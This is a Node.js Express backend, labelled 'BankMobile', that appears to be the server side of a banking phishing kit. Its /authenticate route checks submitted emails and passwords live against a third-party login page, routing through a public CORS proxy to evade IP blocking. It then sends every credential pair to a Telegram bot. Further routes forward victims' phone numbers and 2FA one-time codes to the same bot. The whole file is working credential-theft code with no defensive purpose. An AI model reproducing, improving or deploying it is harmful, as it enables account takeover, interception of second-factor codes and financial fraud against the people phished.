// ================================================
// BANKMOBILE - BACKEND (WITH PROXY)
// ================================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3004;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.log('⚠️ Telegram not configured');
        return false;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Telegram sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);
        
        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);
        
        // ================================================
        // USE A PROXY TO BYPASS RAILWAY IP BLOCK
        // ================================================
        const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent('https://profile.refundselection.com/authenticate/login');
        
        const response = await axios.post(proxyUrl, 
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );
        
        console.log(`Response status: ${response.status}`);
        
        // Check if login was successful
        const data = response.data || '';
        if (data.includes('Welcome') || data.includes('Dashboard') || data.includes('logout') || data.includes('profile')) {
            console.log('✅ SUCCESS - Found success indicators');
            return { success: true };
        }
        
        if (response.status === 302) {
            console.log('✅ SUCCESS - 302 redirect');
            return { success: true };
        }
        
        if (data.includes('Error: Incorrect Email') || data.includes('Error: Incorrect Password')) {
            console.log('❌ FAILED - Invalid credentials');
            return { success: false };
        }
        
        console.log('❌ FAILED');
        return { success: false };
        
    } catch (error) {
        console.log('❌ Error:', error.message);
        
        // Try direct request as fallback
        try {
            console.log('🔄 Trying direct request as fallback...');
            const params2 = new URLSearchParams();
            params2.append('usrname', email);
            params2.append('passwd', password);
            
            const response2 = await axios.post('https://profile.refundselection.com/authenticate/login', 
                params2.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    maxRedirects: 0,
                    validateStatus: (status) => status < 500
                }
            );
            
            if (response2.status === 302) {
                console.log('✅ SUCCESS - 302 redirect (fallback)');
                return { success: true };
            }
            
            const data2 = response2.data || '';
            if (data2.includes('Welcome') || data2.includes('Dashboard')) {
                console.log('✅ SUCCESS - Found success indicators (fallback)');
                return { success: true };
            }
            
            return { success: false };
        } catch (fallbackError) {
            console.log('❌ Fallback also failed:', fallbackError.message);
            return { success: false };
        }
    }
}

app.post('/authenticate', async (req, res) => {
    const { email, password } = req.body;
    
    console.log(`\n🔐 Login attempt: ${email}`);
    
    const result = await authenticateWithAPI(email, password);
    
    if (result.success) {
        const successMsg = `✅ <b>SUCCESS!</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ✅ VALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}`;
        await sendToTelegram(successMsg);
        console.log('✅ VALID');
        res.json({ success: true });
    } else {
        const failMsg = `❌ <b>FAILED</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ❌ INVALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${new Date().toLocaleString('en-US', {timeZone: 'UTC'})}`;
        await sendToTelegram(failMsg);
        console.log('❌ INVALID');
        res.json({ success: false, error: 'Invalid credentials' });
    }
});

app.post('/submit-phone', async (req, res) => {
    const { phone } = req.body;
    console.log(`📱 Phone: ${phone}`);
    await sendToTelegram(`📱 <b>PHONE NUMBER</b>\nNumber: <code>${phone}</code>`);
    res.json({ success: true });
});

app.post('/submit-otp', async (req, res) => {
    const { otp } = req.body;
    console.log(`🔐 OTP: ${otp}`);
    await sendToTelegram(`🔐 <b>2FA CODE</b>\nCode: <code>${otp}</code>`);
    res.json({ success: true });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        service: 'bankmobile-backend',
        telegram: BOT_TOKEN ? '✅ configured' : '❌ not configured'
    });
});

app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Backend API',
        status: 'running'
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ BankMobile Backend running on port ${PORT}`);
    console.log(`📨 Telegram: ${BOT_TOKEN ? '✅ CONFIGURED' : '❌ NOT CONFIGURED'}`);
});
